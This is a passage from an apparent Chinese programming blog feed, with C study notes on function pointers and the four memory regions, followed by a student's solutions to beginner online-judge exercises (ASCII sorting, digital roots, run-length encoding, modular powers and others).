<h5 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h5><pre><code> /*  函数指针的使用示例
    在下面的例子中，着重学习如何通过fun函数中的第三个参数来实现对加减乘等操作的处理。
    需要注意以下几点：
    1. fun函数中第三个形参，函数指针的书写格式int (*p)(int, int)和使用格式(*p)(x, y)
    2. 在调用fun函数时，送入的实参可以有两种形式。
        A.  函数指针作为实参——注意ppp的定义格式       int (*ppp)(int, int);
                                    ppp的赋值写法       ppp= max;    注意，没有括号！没有形参表！此处是将max函数在程序代码区中存储的首地址赋给ppp，并不是函数调用！
                                    ppp作为实参的写法   fun(a, b, ppp)  没有括号，没有形参表！此处，fun的第三个参数ppp就是一个地址

        B.  函数名称作为实参——注意书写格式            fun(a, b, add);
                                     在C语言中，函数名字本身，和数组名称类似，代表了其在内存中存储的首地址
    */

#include &lt;stdio.h&gt;

int fun(int x, int y, int (*p)(int, int));
int max(int x, int y);
int min(int x, int y);
int add(int x, int y);

int main(void)
{
    int a = 34, b = 22, result;
    char n;
    int (*ppp)(int, int);
    ppp= NULL;
    printf(&quot;请选择：1.求大值，2.求小值，3.求和:&quot;);
    n = getchar();
    switch(n)
    {
        case &apos;1&apos;:
            ppp= max;
            result = fun(a, b, ppp);
            break;
        case &apos;2&apos;:
            result = fun(a, b, min);
            break;
        case &apos;3&apos;:
            result = fun(a, b, add);
            break;
        default:
            printf(&quot;选择错误！\n&quot;);
    }
    printf(&quot;%d\n&quot;, result);
    return 0;
}

int fun(int x, int y, int (*p)(int, int)) //第三个参数需要一个指针p，该参数p是一个函数指针，是专门指向“有2个int型形参且返回int的这类函数”的指针
{
    int result;
    result = (*p)(x, y);   //注意书写格式！  调用该类（int XXX(int, int)）函数所需要的实参，往往都是通过“外壳”函数fun的形参x和y传进来~~
    return result;
}


/* 
    注意！函数指针往往出现在当多个函数的函数类型相同的情况下！
    需要注意的是，如果max，min和add函数的类型不是  int XXX(int, int)这种类型，则不能作为fun函数的第三个参数，而
 fun函数如果不能将多个子函数进行整合，则fun函数将失去其存在的意义！
 */

int max(int x, int y)
{
    printf(&quot;大值是:&quot;);
    return x &gt; y ? x : y;
}

int min(int x, int y)
{
    printf(&quot;小值是:&quot;);
    return x &gt; y ? y : x;
}

int add(int x, int y)
{
    printf(&quot;和值是:&quot;);
    return x + y;
}
</code></pre><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>洋洋洒洒的总结了那么多，终于有一种恍然大悟的感觉了，再想一下。  </p>
<p>函数指针：指向函数的指针，可以通过这个指针调用函数，前提是要把这个函数的地址传给指针，再调用函数（*指针变量名）  </p>
<p>指针函数：返回值是指针类型的函数。因为返回的是一个地址，通常可以和数组结合一下。比如返回某一数组元素的地址。（由于返回的是地址，就直接函数名（形参）用就可以了）</p>
]]></content>
      
        <categories>
            
            <category> 数据结构 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[内存四区的理解]]></title>
      <url>/2017/09/08/1/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center"><br>蚕丛及鱼凫，开国何茫然。</blockquote></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>内存四区，之前学C语言的时候，就模模糊糊的看了一下，也没有很仔细的琢磨，后来学PHP和Java在看一些视频的时候，就看到了那些培训的老师，都对这些讲述的很细。有必要系统的总结一下啦，不然底层都弄不好，还怎么学习啊。<br>这里就懒得去找其他语言的例子来讲了，就用C语言来讲一下吧。<br><a id="more"></a></p>
<h2 id="入门案例"><a href="#入门案例" class="headerlink" title="入门案例"></a>入门案例</h2><p><img src="/upload_images/n1.png" alt=""></p>
<h2 id="详解内存四区"><a href="#详解内存四区" class="headerlink" title="详解内存四区"></a>详解内存四区</h2><h3 id="图解内存四区"><a href="#图解内存四区" class="headerlink" title="图解内存四区"></a>图解内存四区</h3><p><img src="/upload_images/n2.png" alt=""></p>
<h3 id="内存四区介绍"><a href="#内存四区介绍" class="headerlink" title="内存四区介绍"></a>内存四区介绍</h3><h4 id="栈区"><a href="#栈区" class="headerlink" title="栈区"></a>栈区</h4><p>由编译器自动分配释放, 存放函数的参数值,局部变量等.  </p>
<p>例如: 参数buf,参数bufsize和size都是存放在栈区.<font color="orange">当函数执行完毕的时候,自动释放</font></p>
<pre><code>void  recev(char* buf, int bufsize){
            int size;
}
</code></pre><h4 id="堆区"><a href="#堆区" class="headerlink" title="堆区"></a>堆区</h4><p>一般由程序员分配释放(动态内存申请与释放),若程序员不释放,程序结束时<font color="red">可能由操作系统回收</font></p>
<p>例如:下面的src所指向的内存空间就是在堆区</p>
<pre><code>char* src = (char*) malloc(sizeof(buf) * sizeof(10));
</code></pre><h4 id="全局区-静态区、常量区"><a href="#全局区-静态区、常量区" class="headerlink" title="全局区(静态区、常量区)"></a>全局区(静态区、常量区)</h4><p>全局变量和静态变量存放在此. 里面细分有一个常量区, 字符串常量和其他常量也存放在此. <font color="orange">该区域是在程序结束后由操作系统释放.</font></p>
<h4 id="程序代码区"><a href="#程序代码区" class="headerlink" title="程序代码区"></a>程序代码区</h4><p>这个区域存放函数体的二进制代码.也是由操作系统进行管理的</p>
<h3 id="划分内存四区的意义"><a href="#划分内存四区的意义" class="headerlink" title="划分内存四区的意义"></a>划分内存四区的意义</h3><p>C语言程序中,根据是局部变量,全局变量, 常量还是通过malloc等类似的函数分配内存空间, 把他们放到对应的内存区中.这样就赋予了这些变量或常量不同的生命周期, 不同的释放方式. 根据我们程序的需要,我们在编码过程中,声明不同的变量类型, 使他们有不同的声明长度, 不同的释放方式,给我们更大的灵活编程</p>
<h2 id="理解时出现的疑问"><a href="#理解时出现的疑问" class="headerlink" title="理解时出现的疑问"></a>理解时出现的疑问</h2><h3 id="关于栈内存的进栈顺序"><a href="#关于栈内存的进栈顺序" class="headerlink" title="关于栈内存的进栈顺序"></a>关于栈内存的进栈顺序</h3><p>正如入门案例图上所示，都是操作系统或者某函数的状态在最下面，接下来是返回地址。程序读取的时候，按道理难道不应该是从main函数依次往下读取，最后才能读取到返回值么？ </p>
<h4 id="答"><a href="#答" class="headerlink" title="答"></a>答</h4><h5 id="标准解释"><a href="#标准解释" class="headerlink" title="标准解释"></a>标准解释</h5><p>执行双击的时候，是操作系统将软件加载到内存。操作系统的可执行程序也是提前加载到内存的。<br>操作系统找到main函数入口，开始执行。操作系统将应用程序分成四个区：代码区，堆区，栈区和全局区。<br>在网上找到这个图 <img src="/upload_images/n3.jpg" alt="">  </p>
<h5 id="更加通俗的说法："><a href="#更加通俗的说法：" class="headerlink" title="更加通俗的说法："></a>更加通俗的说法：</h5><h6 id="说法一："><a href="#说法一：" class="headerlink" title="说法一："></a>说法一：</h6><p>  图上main函数橙色的区域：这4块内容，在main函数执行结束之后，是先后一起弹出来的。局部变量和形参弹出来之后就丢弃了，可以视为扔掉了。返回地址和其他现场信息（运行状态信息）弹出来之后会被送到CPU或者其他相关芯片或者某些变量中，以便恢复到该程序被调用之前的状态。  </p>
<h6 id="说法二："><a href="#说法二：" class="headerlink" title="说法二："></a>说法二：</h6><p>  相当于现场信息是对刚开始的操作系统的运行状态拍快照，程序结束后，从main函数的栈区里面把这个快照取出来，然后去恢复环境，把环境恢复为原来调用之前操作系统的各方面的样子。   </p>
<h6 id="说法三："><a href="#说法三：" class="headerlink" title="说法三："></a>说法三：</h6><p>打一个比方：比如你现在正在数钱，数到第320张的时候，用户来找你，让你去执行他的main函数。你怎么办？    </p>
<p>你只有一个办法，放下手里的活，去执行。但是，执行完了之后，等你回来，难道你要重新开始数钱么？当然不会。这个时候，最聪明的做法，就是，在你转去执行main之前，先记录一下你现在数了多少张，并且卡一个书签在数过及没数过的钱之间。</p>
<p>这个书签，就是返回地址。你回来之后，从这个位置开始继续往下数钱。这个记录下来的已数过钱的数额，就是所谓的现场信息。</p>
<p>在操作系统中，没有书签这个东西。他们会记录下一些当时cpu跳转之前，周围一些必要的数据信息，以便于回来之后继续执行</p>
<p>而这些信息，它是带到了main的栈区里面去保存的。</p>
<p>在执行main函数时，它会放心大胆滴修改cpu各个寄存器的值。各条总线的值，各个开关的值。</p>
<p>等执行完程序，回来之后，它会按照栈区里面弹出来的这个现场信息的内容，去恢复现在的现场，恢复成调用之前的样子，然后继续作后面的事。</p>
<h3 id="关于内存泄漏"><a href="#关于内存泄漏" class="headerlink" title="关于内存泄漏"></a>关于内存泄漏</h3><h4 id="内存泄漏的原理"><a href="#内存泄漏的原理" class="headerlink" title="内存泄漏的原理"></a>内存泄漏的原理</h4><p>内存泄露的原理，当我们再堆区中分配的内存如果没有手工释放，程序结束后会把栈中的内存回收释放，该栈中保存了一个指向堆区元素的指针。然而这个指针一旦释放了后，就再也没有元素指向堆区的那块元素，然而堆区中的那块元素又没有释放，这自然而然的造成了内存泄露。</p>
<h4 id="垃圾对象回收几种语言的比较"><a href="#垃圾对象回收几种语言的比较" class="headerlink" title="垃圾对象回收几种语言的比较"></a>垃圾对象回收几种语言的比较</h4><p>C和C++没有垃圾回收机制，所以一旦malloc之后的空间不再使用，成为垃圾之后，需要程序员自己去调用free函数来释放空间。    </p>
<p>PHP 销毁资源使用析构函数。析构函数是在对象被销毁时自动释放的，不需要调用。  </p>
<p>JAVA  （因为自己还没有学到JAVA的垃圾回收，只能通过网上的这些资料，等学到了，再用自己的语言总结一下） <a href="http://www.cnblogs.com/gengyulong/archive/2012/03/20/2407455.html" target="_blank" rel="external">Java中的垃圾回收与对象生命周期</a>  </p>
<p>堆内存在JVM启动的时候被创建，堆内存中所存储的对象可以被JVM自动回收，不能通过其他外部手段回收，也就是说开发人员无法通过添加相关代码的手段来回收堆内存中的对象。堆内存通常情况下被分为两个区域：新对象区域与老对象区域。</p>
<p>新对象区域：又可细分为三个小区域：伊甸园区域、From区域与To区域。伊甸园区域用来保存新创建的对象，它就像一个堆栈，新的对象被创建，就像指向该栈的指针在增长一样，当伊甸园区域中的对象满了之后，JVM系统将要做到可达性测试，主要任务是检测有哪些对象由根集合出发是不可达的，这些对象就可以被JVM回收，并且将所有的活动对象从伊甸园区域拷贝到To区域，此时一些对象将发生状态交换，有的对象就从To区域被转移到From区域，此时From区域就有了对象。上面对象迁移的整个过程，都是由JVM控制完成的。</p>
<p>老对象区域：在老对象区域中的对象仍然会有一个较长的生命周期，大多数的JVM系统垃圾对象，都是源于”短命”对象，经过一段时间后，被转入老对象区域的对象，就变成了垃圾对象。此时，它们都被打上相应的标记，JVM系统将会自动回收这些垃圾对象，建议不要频繁地强制系统作垃圾回收，这是因为JVM会利用有限的系统资源，优先完成垃圾回收工作，导致应用无法快速地响应来自用户端的请求，这样会影响系统的整体性能。</p>
]]></content>
      
        <categories>
            
            <category> 数据结构 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SYC基础C语言(A~P)writeup]]></title>
      <url>/2017/09/07/SYC%E5%9F%BA%E7%A1%80C%E8%AF%AD%E8%A8%80-A-P-writeup/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><br>慈母手中线，游子身上衣。</blockquote>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>不知不觉暑假已经过去了，更加恐怖的是，我已经开学了几天了，开学这几天在做SYC上面的C语言，一个原因是受人所托，二呢，一个暑假都没有看过写过C了，自己有好多都忘记了。而且做的时候，发现上学期学的C真的很基础，很简单，很多C里面的东西都没有学到，就正好get一些新的知识啦~    </p>
<p>编程题是根据字母（A~Z）分类的，后面5道是给学长做的（哇，学姐就不能做了么，抠鼻）<a id="more"></a>，但是好吧，我自己觉得前面(A~P)才是属于基础一些的题目，所以写的WP就从P开始分类吧。  </p>
<h2 id="题目和代码"><a href="#题目和代码" class="headerlink" title="题目和代码"></a>题目和代码</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>这里面的题基本都用了一个相同的点，也是我之前没见过的，就是你没说停下，就可以一直输入。大概是长这个样子 <font color="red">未给定行数的用while(scanf(它的参数)!=EOF)处理 </font><br>然后那种简单的题目，就不贴思路了~有些题目有很多种方法，就直接写在下面注释了，也是可以用的~</p>
<h3 id="A-ASCII码排序"><a href="#A-ASCII码排序" class="headerlink" title="A-ASCII码排序"></a>A-ASCII码排序</h3><pre><code>#include &lt;stdio.h&gt;

int main (void)
{
char s[3],m,x,y,z;
while (scanf(&quot;%s&quot;,s)!=EOF)
{
    x=s[0];
    y=s[1];
    z=s[2];
    if(x&gt;y)
    {
        m=x;
        x=y;
        y=m;
    }
    if(x&gt;z)
    {
        m=x;
        x=z;
        z=m;
    }
    if(y&gt;z)
    {
        m=y;
        y=z;
        z=m;
    }
    printf(&quot;%c %c %c\n&quot;,x,y,z);
   }
return 0;
}

/*{
    if(x&gt;z &amp;&amp; y&gt;z)
    {
    printf(&quot;%c %c %c\n&quot;,z,x,y);
    }
    else if(x&lt;z &amp;&amp; y&gt;z)
    {
    printf(&quot;%c %c %c\n&quot;,x,z,y);
    }
    else if(x&lt;z &amp;&amp; y&lt;z)
    {
    printf(&quot;%c %c %c\n&quot;,x,y,z);
    }
    }
    fflush(stdin);//清除输入缓冲区*/

/*
char m,x,y,z;
while (scanf(&quot;%c%c%c&quot;,&amp;x,&amp;y,&amp;z)!=EOF)
{
    fflush(stdin);
    if(x&gt;y)
    {
        m=x;
        x=y;
        y=m;
    }
    if(x&gt;z)
    {
        m=x;
        x=z;
        z=m;
    }
    if(y&gt;z)
    {
        m=y;
        y=z;
        z=m;
    }
    printf(&quot;%c %c %c\n&quot;,x,y,z);
    */
</code></pre><h3 id="B-计算两点间的距离"><a href="#B-计算两点间的距离" class="headerlink" title="B-计算两点间的距离"></a>B-计算两点间的距离</h3><pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;math.h&gt;
int main (void)
{
    double x1,y1,x2,y2;
    double length;
    while(scanf(&quot;%lf%lf%lf%lf&quot;,&amp;x1,&amp;y1,&amp;x2,&amp;y2)!=EOF)
    {
        length=sqrt((x1-x2)*(x1-x2)+(y1-y2)*(y1-y2));
        printf(&quot;%.2lf\n&quot;,length);

    }
    return 0;
}
</code></pre><h3 id="C-计算球的体积"><a href="#C-计算球的体积" class="headerlink" title="C-计算球的体积"></a>C-计算球的体积</h3><pre><code>#include &lt;stdio.h&gt;
#define PI 3.1415927

int main(void){

   double r,v;
    while(scanf(&quot;%lf&quot;,&amp;r)!=EOF)
    {
       v=((r*r*r)*4*PI)/3;
       printf(&quot;%.3lf\n&quot;,v);
    }
    return 0;
}
</code></pre><h3 id="D-求绝对值"><a href="#D-求绝对值" class="headerlink" title="D-求绝对值"></a>D-求绝对值</h3><pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;math.h&gt;

int main (void)
{
    double x;
    while (scanf(&quot;%lf&quot;,&amp;x)!=EOF)
    { 
       printf(&quot;%.2lf\n&quot;,fabs(x));
    }
    return 0;
}
</code></pre><h3 id="E-Digital-Roots"><a href="#E-Digital-Roots" class="headerlink" title="E-Digital Roots"></a>E-Digital Roots</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这个题一开始没有做，因为可能是懒吧，不想看英语，然后强迫症觉得少了一个题，很不开心，就硬着头皮把他读下来了<br>题意：把输入的数每个位上的数相加，一直加到只剩一个数为止<br>eg：39  3+9=12 1+2=3</p>
<p>这个题目有坑哦~因为这题测试数据可能会很长，所以不能一位一位数字来取，又想到用字符串的方式处理。  </p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main() {
    char str[10000];
    int sum;
    int i;
    while (scanf(&quot;%s&quot;, str) != EOF) {
        if(str[0]==&apos;0&apos;)
       {
         break;
        }
        sum = 10;
        while (sum &gt;= 10) {
            sum = 0;
            for (i = 0; str[i] != 0; i++) {
                sum += str[i] - &apos;0&apos;;
            }
            sprintf(str, &quot;%d&quot;, sum);
        }
        printf(&quot;%d\n&quot;, sum);
    }

    return 0;
}
</code></pre><h4 id="新知识"><a href="#新知识" class="headerlink" title="新知识"></a>新知识</h4><p>在这里新学会了一个sprintf 的运用<br>贴一个链接<a href="http://www.cnblogs.com/Anker/p/3351168.html" target="_blank" rel="external">sprintf的运用</a></p>
<pre><code>#include&lt;stdio.h&gt; 
int main(void) 
{ 
  char s[40]; 

  sprintf(s,&quot;%s%d%c&quot;,&quot;test&quot;,1,&apos;2&apos;); //存到字符串里面去了
  /*第一个参数就是指向要写入的那个字符串的指针，剩下的就和printf()一样了 

  //可以比较一下，这是向屏幕输入 
 // printf(&quot;%s%d%c&quot;,&quot;test&quot;,1,&apos;2&apos;); 

printf(&quot;%s&quot;,s);
return 0; 
}
</code></pre><p>因此上面的代码可以简化成为这样（然而，这个代码我没有扔到题目上，只是本地测试了一下，是可以的）</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main (void)
{
    char s[1000];
    int sum,i;

    while (scanf(&quot;%s&quot;,s) != EOF)
    {
        if(strcmp(s,&quot;0&quot;) == 0)
        {
            break;
        }

        sum =10;
        while (sum &gt;= 10)
        {
            sum =0;
             for (i=0;s[i] != &apos;\0&apos;;i++)
             {
                 sum+= s[i] - &apos;0&apos;;
                if(sum &gt; 9)
                 {
                     sum=sum%10+sum/10;
                 }
             }
             //sprintf(s, &quot;%d&quot;, sum);//真的很方便啊！
        }
        printf(&quot;%d\n&quot;,sum);
    }

    return 0;
}
</code></pre><h3 id="F-求奇数的乘积"><a href="#F-求奇数的乘积" class="headerlink" title="F-求奇数的乘积"></a>F-求奇数的乘积</h3><pre><code>#include &lt;stdio.h&gt;

int main(void)
{
    int n,num[100],i;
    int res;
    while (scanf(&quot;%d&quot;,&amp;n) != EOF)
    {
        res = 1;
        for(i=0;i&lt;n;i++)
        {
            scanf(&quot;%d&quot;,&amp;num[i]);
            if(num[i]%2!=0)
            {
                res*=num[i];
            }
        }

        printf(&quot;%d\n&quot;,res);
    }
    return 0;
}
</code></pre><h3 id="G-数值统计"><a href="#G-数值统计" class="headerlink" title="G-数值统计"></a>G-数值统计</h3><pre><code>#include &lt;stdio.h&gt;

int main(void)
{
    int n,i;
    double a[100];
    int num1,num2,num3;

    while (scanf(&quot;%d&quot;,&amp;n)!= EOF)
    {
        num1=0;num2=0;num3=0;
        if(n==0)
        {
          break;
        }
        for (i=0;i&lt;n;i++)
        {
            scanf(&quot;%lf&quot;,&amp;a[i]);
               if(a[i] ==0)
            {
                num2++;
            }
            else if(a[i] &lt;0 )
            {
                num1++;

            }
            else if(a[i]&gt;0)
            {
                num3++;
            }
        }
        printf(&quot;%d %d %d\n&quot;,num1,num2,num3);

    }
    return 0;
}
</code></pre><h3 id="H-多项式求和"><a href="#H-多项式求和" class="headerlink" title="H-多项式求和"></a>H-多项式求和</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>一开始把题目都看错了，以为都是加，还说怎么一直都没有正确答案，后来才看到自己题目都理解错了。既然有加有减，那肯定和（-1）的n次方有关了啊</p>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><pre><code>#include &lt;stdio.h&gt;
int main(void)
{
    int m=-1;
    int n,i,j;
    int num[100];
    double sum;

    while (scanf(&quot;%d&quot;,&amp;n) != EOF)
    {
        for(i=0;i&lt;n;i++)
        {

            scanf(&quot;%d&quot;,&amp;num[i]);
            sum=0;
            m=-1;
            for (j=1; j&lt;=num[i]; j++)
            {
                m = m*(-1);
                sum = sum+ m*(1.0/j);
            }
            printf(&quot;%.2lf\n&quot;,sum);
        }

    }
    return 0;
}
</code></pre><h4 id="新知识-1"><a href="#新知识-1" class="headerlink" title="新知识"></a>新知识</h4><p>这里学了一个关于A的B次方的C语言用法    </p>
<p>利用math.h中的pow（）函数进行：<br>函数定义如下：  </p>
<pre><code>double pow(double x,double y)
</code></pre><p>可以实现x的y次幂（返回值）  </p>
<p>example：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;math.h&gt;
int main()
{
    printf(&quot;%f&quot;,pow(2,3));
    return 0;
}
</code></pre><h3 id="I-蟠桃记"><a href="#I-蟠桃记" class="headerlink" title="I-蟠桃记"></a>I-蟠桃记</h3><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>这个题开始我想用递归做的，后来觉得这样太麻烦了，可以直接倒推回去<br>（剩下的桃子+1）*2 就是上一天的桃子啊</p>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><pre><code>#include &lt;stdio.h&gt;
int main(void)
{
   int n,sum,i;

   while (scanf(&quot;%d&quot;,&amp;n) != EOF)
   {
       sum=1;
       for(i=1;i&lt;n;i++)
       {
           sum=(sum+1)*2;
       }
       printf(&quot;%d\n&quot;,sum);
   }

    return 0;
}
</code></pre><h3 id="J-Encoding"><a href="#J-Encoding" class="headerlink" title="J-Encoding"></a>J-Encoding</h3><h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><p>就是计算出现相同字母的次数，1的时候不用标注</p>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;math.h&gt;

int main(void)
{
    int n,i,num;
    char str[10000];
    int length;
    scanf(&quot;%d&quot;,&amp;n);
    while(n--)
    {
        num=1;
        scanf(&quot;%s&quot;,str);
        length=strlen(str);
        for(i=0;i &lt; length;i++)
        {
            if(str[i]==str[i+1])
            {
                num++;
            }
            else
            {
                if(num&lt;=1)
                {
                    printf(&quot;%c&quot;,str[i]);
                    num=1;
                }
                else
                {
                    printf(&quot;%d%c&quot;,num,str[i]);
                    num=1;//一定记得为1，不然后面出问题

                }
            }


        }
        printf(&quot;\n&quot;);    
    }


    return 0;
}
</code></pre><h3 id="K-字符串统计"><a href="#K-字符串统计" class="headerlink" title="K-字符串统计"></a>K-字符串统计</h3><pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void)

{
    int n,i;
    int num;
    char s[1000];

   scanf(&quot;%d&quot;,&amp;n);

    while (n--)
    {
        scanf(&quot;%s&quot;,s);
        num=0;
        for(i=0;i&lt;strlen(s);i++)
        {
            if(s[i] &gt;=&apos;0&apos; &amp;&amp; s[i] &lt;=&apos;9&apos;)
            {
                num++;
            }
        }
        printf(&quot;%d\n&quot;,num);
    }

    return 0;
}
</code></pre><h3 id="L-数列有序！"><a href="#L-数列有序！" class="headerlink" title="L-数列有序！"></a>L-数列有序！</h3><p>####注意<br>这个题应该是可以采取折半查找的，做的时候没有想到。实在是不应该。这个题用的是冒泡排序</p>
<h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><pre><code>#include &lt;stdio.h&gt;
int main(void)
{
    int n,m,i,j;
    int a[100];
    int temp;

    while (scanf(&quot;%d%d&quot;,&amp;n,&amp;m)!=EOF)
    {
        if(n==0 &amp;&amp; m==0)
        {
            break;
        }
        else
        {
            for(i=0;i&lt;n;i++)
            {
                scanf(&quot;%d&quot;,&amp;a[i]);
            }
            a[n]=m;

            for(i=0;i&lt;n+1;i++)
            {
                for (j=0;j&lt;n;j++)
                {
                    if(a[j]&gt;a[j+1])
                    {
                        temp=a[j];
                        a[j]=a[j+1];
                        a[j+1]=temp;
                    }
                }
            }
            for (i=0;i&lt;n+1;i++)
            {

                if(i==n)
                {
                    printf(&quot;%d&quot;,a[i]);
                }
                else
                {
                    printf(&quot;%d &quot;,a[i]);
                }
            }
            printf(&quot;\n&quot;);
        }
    }
    return 0;
}
</code></pre><h3 id="M-求平均成绩"><a href="#M-求平均成绩" class="headerlink" title="M-求平均成绩"></a>M-求平均成绩</h3><pre><code>#include &lt;stdio.h&gt;
#include &lt;math.h&gt;

int main(void)
{
    int n,m,sum,count,i,j,flag;
    int a[50][50];
    double ave1[50],ave2[50];

    while (scanf(&quot;%d%d&quot;,&amp;n,&amp;m) != EOF)
    {

        for (i=0;i&lt;n;i++)
        {
            for (j=0;j&lt;m;j++)
            {
                scanf(&quot;%d&quot;,&amp;a[i][j]);
            }
        }

         //每个人平均成绩
        for(i=0;i&lt;n;i++)
        {
            sum=0;
            for(j=0;j&lt;m;j++)
            {
                sum+=a[i][j];
            }

            ave1[i]=(sum*1.0)/m;
        }
       //每门课的平均成绩
        for(j=0;j&lt;m;j++)
        {
            sum=0;
            for(i=0;i&lt;n;i++)
            {
                sum+=a[i][j];
            }
                ave2[j]=(sum*1.0)/n;
        }

        //这里比较的时候一定要注意，他是成绩每一科目都要比较，但是是一个人
        count=0;
        for(i=0;i&lt;n;i++)
        {

            flag=0;
            for(j=0;j&lt;m;j++)
            {
                if(a[i][j]&gt;=ave2[j])
                {
                    flag++;

                }


                if(flag==m-1)
                {
                    count++;
                }
            }


        }

        /* 第二种方法
        count=0;
        for(i=0;i&lt;n;i++)
        {
            flag=1;
            for(j=0;j&lt;m;j++)
                if(a[i][j]&lt;ave2[j])
                {
                    flag=0;
                    break;
                }
            if(flag)
                count++;
        }*/


        for(i=0;i&lt;n;i++)
        {
              if(i==n-1)
              printf(&quot;%.2lf\n&quot;,ave1[i]);
            else
                printf(&quot;%.2lf &quot;,ave1[i]);
        }

        for(i=0;i&lt;m;i++)
        {
             if(i==m-1)
              printf(&quot;%.2lf\n&quot;,ave2[i]);
            else
                printf(&quot;%.2lf &quot;,ave2[i]);
        }
        printf(&quot;%d\n\n&quot;,count);

    }
    return 0;
}
</code></pre><h3 id="N-查找最大元素"><a href="#N-查找最大元素" class="headerlink" title="N-查找最大元素"></a>N-查找最大元素</h3><pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void)
{

    char s[100];
    int i,j,len;
    char max;

    while (scanf(&quot;%s&quot;,s) != EOF)
    {
        len=strlen(s);
        max=&apos;a&apos;;

        for (i=0;i&lt;len;i++)
        {
            if(s[i]&gt;max)
            {
                max=s[i];
            }
        }

        for (i=0;i&lt;len;i++)
        {
            if(s[i]==max)
                 printf(&quot;%c(max)&quot;,s[i]);
            else
                printf(&quot;%c&quot;,s[i]);

        }
        printf(&quot;\n&quot;);


    }

    return 0;
}
</code></pre><h3 id="O-Text-Reverse"><a href="#O-Text-Reverse" class="headerlink" title="O-Text Reverse"></a>O-Text Reverse</h3><h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><p>字符串以一个空格为间隔，倒序排列。<br>Sample Input</p>
<pre><code>3
olleh !dlrow
m&apos;I morf .udh
I ekil .mca
</code></pre><p>Sample Output</p>
<pre><code>hello world!
I&apos;m from hdu.
I like acm.
</code></pre><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><p>将空格提取出来，空格以前的字符串存储起来，再进行倒序。注意输入的换行要读取了，不然会出错</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void)
{
    int n,i,j,len,k;
    char s1[1000];

    scanf(&quot;%d&quot;,&amp;n);
    getchar();//换行
    while(n--)
    {
        gets(s1);

        len=strlen(s1);


        for (i=0,j=0;i&lt;len;i++)
        {
            if(s1[i]==&apos; &apos;)//要用单引号 而不是双引号  
            {
                for(k=i-1;k&gt;=j;k--)
                {
                    printf(&quot;%c&quot;,s1[k]);
                }
                printf(&quot; &quot;);
                j=i+1;

            }
        }

        for(k=len-1;k&gt;=j;k--)//最后一个单词的输出
        {
            printf(&quot;%c&quot;,s1[k]);
        }
        printf(&quot;\n&quot;);

    }
    return 0;
}
</code></pre><h3 id="P-人见人爱A-B"><a href="#P-人见人爱A-B" class="headerlink" title="P-人见人爱A^B"></a>P-人见人爱A^B</h3><p>####注意<br>这个题要注意int的溢出问题<br>如果我们只是采用一直算的话，不能找到一个数据类型来储存这个数，因此，这个办法是不行的。我们知道，要知道一个幂的后三位，只需要对这个数一直%1000即可，比如1230%1000=230；2323456789%1000=789……这样我们这个问题就简单了，只要每次乘以一个数对1000取余即可。</p>
<h4 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h4><pre><code>#include&lt;stdio.h&gt;  
int main()  
{  
    int a,b,s,i;  
    while(scanf(&quot;%d%d&quot;,&amp;a,&amp;b)!=EOF)  
    {  
        if(a==0&amp;&amp;b==0)  
            break;  
        s=a;  
        for(i=1;i&lt;b;i++)
        {  
            s=(s*a)%1000;
        }  
        printf(&quot;%d\n&quot;,s);  
    }  
    return 0;  
}  
</code></pre><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>磨蹭了几天把前面的题写了。后面的题写了几道，发现有些需要数据结构的知识，只能边学边写了。这里只恨自己不会python，因为平台13号就要关闭了，要是可以自己爬下来多练习练习就好了。而且很多这些代码都没有考虑代码的健壮性。就只能勉强说暂且作为复习C用吧。<br>这些题目也是一些很基础的ACM题目吧，现在平台第一名是一个对ACM很感兴趣的人，和他交流之后，更加提升了我对算法的兴趣，想这学期结合一下数据结构学习一些算法吧。</p>
<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>1.调试进入函数内部问题<br>2.循环的时候，定义的变量到底是在循环内（循环内，每次循环就要重新被赋值，要想清楚）<br>3.换行，空格这些字符，要注意清除缓存fflush(stdin);或者getchar();<br>4.学到的新知识<br>  1）E题型的sprintf的运用<br>  2）H题型想到的关于A的B次方的C语言用法 </p>
]]></content>
      
        <categories>
            
            <category> ACM </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ACM </tag>
            
            <tag> C语言 </tag>
            
        </tags>
        
    </entry>
